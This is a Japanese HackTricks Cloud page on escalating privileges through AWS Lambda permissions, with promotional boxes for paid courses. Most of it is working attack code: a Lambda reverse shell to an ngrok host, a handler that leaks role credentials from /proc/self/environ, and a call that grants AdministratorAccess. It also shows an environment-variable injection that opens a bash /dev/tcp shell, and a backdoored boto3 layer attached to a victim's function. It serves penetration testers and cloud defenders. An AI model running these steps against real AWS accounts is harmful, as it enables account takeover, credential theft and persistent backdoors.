# AWS - Lambda Privesc

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する。
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## lambda

Lambdaに関する詳細情報:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, および `lambda:InvokeFunction`** 権限を持つユーザーは特権を昇格させることができます。\
彼らは**新しいLambda関数を作成し、既存のIAMロールを割り当てる**ことができ、そのロールに関連付けられた権限を関数に付与できます。その後、ユーザーはこのLambda関数にコードを書き込み、アップロードすることができます（たとえば、rev shell）。\
関数が設定されると、ユーザーはAWS APIを介してLambda関数をトリガーし、意図したアクションを実行できます。このアプローチにより、ユーザーはLambda関数を介して間接的にタスクを実行し、それに関連付けられたIAMロールが付与されたアクセスレベルで操作することができます。\\

攻撃者はこれを悪用して**rev shellを取得し、トークンを盗む**ことができます:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
あなたは、Lambda関数自体からLambdaロールの権限を**悪用**することもできます。\
Lambdaロールに十分な権限がある場合、それを使用して管理者権限を付与することができます：
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
また、外部接続を必要とせずに、Lambdaのロール資格情報を漏洩させることも可能です。これは、内部タスクで使用される**ネットワーク隔離されたLambda**に役立ちます。逆シェルをフィルタリングする未知のセキュリティグループがある場合、このコード片は、Lambdaの出力として資格情報を直接漏洩させることを可能にします。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在的影響:** 指定された任意のLambdaサービスロールへの直接権限昇格。

{% hint style="danger" %}
興味深いように見えるかもしれませんが、**`lambda:InvokeAsync`** だけでは **`aws lambda invoke-async`** を実行することはできません。**`lambda:InvokeFunction`** も必要です。
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

前述のシナリオと同様に、**`lambda:AddPermission`** 権限があれば、**`lambda:InvokeFunction`** 権限を自分自身に付与することができます。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在的影響:** 指定された任意のLambdaサービスロールへの直接権限昇格。

ユーザーは**`iam:PassRole`、`lambda:CreateFunction`、および`lambda:CreateEventSourceMapping`**権限（および潜在的に`dynamodb:PutItem`および`dynamodb:CreateTable`）を持っている場合、`lambda:InvokeFunction`なしでも間接的に**権限昇格**が可能です。\
彼らは悪意のあるコードを持つLambda関数を作成し、既存のIAMロールを割り当てることができます。

Lambdaを直接呼び出す代わりに、ユーザーはDynamoDBテーブルを設定するか既存のテーブルを利用し、そのテーブルをLambdaにイベントソースマッピングを介してリンクします。この設定により、Lambda関数はテーブルに新しいアイテムがエントリされるたびに自動的にトリガーされ、ユーザーのアクションまたは他のプロセスによってLambda関数が間接的に呼び出され、渡されたIAMロールの権限でコードが実行されます。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
もしDynamoDBがAWS環境で既にアクティブである場合、ユーザーはLambda関数のために**イベントソースマッピングを確立する必要があります**。しかし、もしDynamoDBが使用されていない場合、ユーザーはストリーミングを有効にした新しいテーブルを**作成する必要があります**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
今、**イベントソースマッピングを作成**して、Lambda関数をDynamoDBテーブルに**接続することが可能**です：
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda 関数が DynamoDB ストリームにリンクされている場合、攻撃者は DynamoDB ストリームをアクティブ化することで Lambda を**間接的にトリガー**することができます。これは、DynamoDB テーブルに**アイテムを挿入**することで達成できます：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**潜在的影響:** 指定されたLambdaサービスロールへの直接権限昇格。

### `lambda:AddPermission`

この権限を持つ攻撃者は、**自分自身（または他のユーザー）に任意の権限を付与**できます（これにより、リソースへのアクセス権限を付与するリソースベースのポリシーが生成されます）:

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在的影響:** コードの変更と実行の許可を与えることで、Lambdaサービスロールへの直接的な権限昇格が可能となります。

### `lambda:AddLayerVersionPermission`

この権限を持つ攻撃者は、`lambda:GetLayerVersion` 権限を自分自身（または他者）に付与することができます。彼はレイヤーにアクセスして脆弱性や機密情報を検索することができます。

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**潜在的影響:** 機密情報への潜在的なアクセス。

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** 権限を持つユーザーは、**IAM ロールにリンクされた既存の Lambda 関数のコードを変更する可能性があります。**\
攻撃者は、**Lambda のコードを変更して IAM 資格情報を外部に送信する**ことができます。

攻撃者は関数を直接呼び出す能力を持っていないかもしれませんが、Lambda 関数が事前に存在し稼働している場合、既存のワークフローやイベントを介してトリガーされる可能性が高いため、変更されたコードの実行が間接的に容易になります。

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**潜在的影響:** 使用されているLambdaサービスロールへの直接的な権限昇格。

### `lambda:UpdateFunctionConfiguration`

#### 環境変数を通じたRCE

この権限を持つと、Lambdaが任意のコードを実行するようにする環境変数を追加することが可能です。例えば、Pythonでは環境変数 `PYTHONWARNING` と `BROWSER` を悪用して、Pythonプロセスが任意のコマンドを実行することができます。
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

他のスクリプト言語では、使用できる他の環境変数があります。詳細については、次のスクリプト言語のサブセクションを確認してください：

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### Lambda Layersを介したRCE

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) は、**コードを含める**ことができますが、**別々に保存**されるため、関数コードを小さく保ちつつ、**複数の関数でコードを共有**できます。

Lambda内では、次のような関数を使用して、Pythonコードが読み込まれるパスを確認できます：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
これらは場所です：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

たとえば、ライブラリboto3は`/var/runtime/boto3`（4番目の位置）からロードされます。

#### 悪用

`lambda:UpdateFunctionConfiguration`権限を悪用して、**lambda関数に新しいレイヤーを追加**することが可能です。任意のコードを実行するには、このレイヤーに**lambdaがインポートするライブラリ**が含まれている必要があります。Lambdaのコードを読むことができれば、これを簡単に見つけることができます。また、Lambdaが**すでにレイヤーを使用**している可能性があり、そのレイヤーを**ダウンロード**してそこに**コードを追加**することができるかもしれません。

たとえば、Lambdaがライブラリboto3を使用しているとします。これにより、ライブラリの最新バージョンを含むローカルレイヤーが作成されます：
```bash
pip3 install -t ./lambda_layer boto3
```
あなたは`./lambda_layer/boto3/__init__.py`を開いて、**グローバルコードにバックドアを追加**することができます（たとえば、資格情報を外部に送信するための関数やリバースシェルを取得する関数など）。

その後、`./lambda_layer`ディレクトリをzipに圧縮し、新しいLambdaレイヤーをあなた自身のアカウントに**アップロード**します（または被害者のアカウントにアップロードすることもできますが、その場合は権限がないかもしれません）。
注意点として、`/opt/python/boto3`を上書きするために、Pythonフォルダを作成してライブラリをそこに配置する必要があります。また、Lambdaで使用されているPythonバージョンと**互換性のある**レイヤーである必要があり、あなたのアカウントにアップロードする場合は、**同じリージョン**にある必要があります。
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

今、アップロードされたLambdaレイヤーを**どのアカウントでもアクセス可能**にしてください：
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
そして、lambda レイヤーを被害者の lambda 関数に添付します:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
次のステップは、**関数を自分で呼び出す**か、通常の手段で**呼び出されるのを待つ**ことです。- どちらが安全な方法か。

この脆弱性を悪用する**より潜在的な方法**は、以下で見つけることができます：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在的な影響:** 使用されているLambdaサービスロールへの直接的な権限昇格。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

これらの権限を持っている場合、関数を作成し、URLを呼び出して実行することができるかもしれません... しかし、私はそれをテストする方法を見つけることができませんでしたので、できるかどうか教えてください！

### Lambda MitM

一部のLambdaは、**ユーザーからのパラメーターで機密情報を受信**することになります。そのうちの1つでRCEを取得すると、他のユーザーが送信している情報を外部に流出させることができます。詳細は以下で確認できます：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## 参考文献

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**</strong> で**ゼロからヒーローまでAWSハッキングを学ぶ**</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や、**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
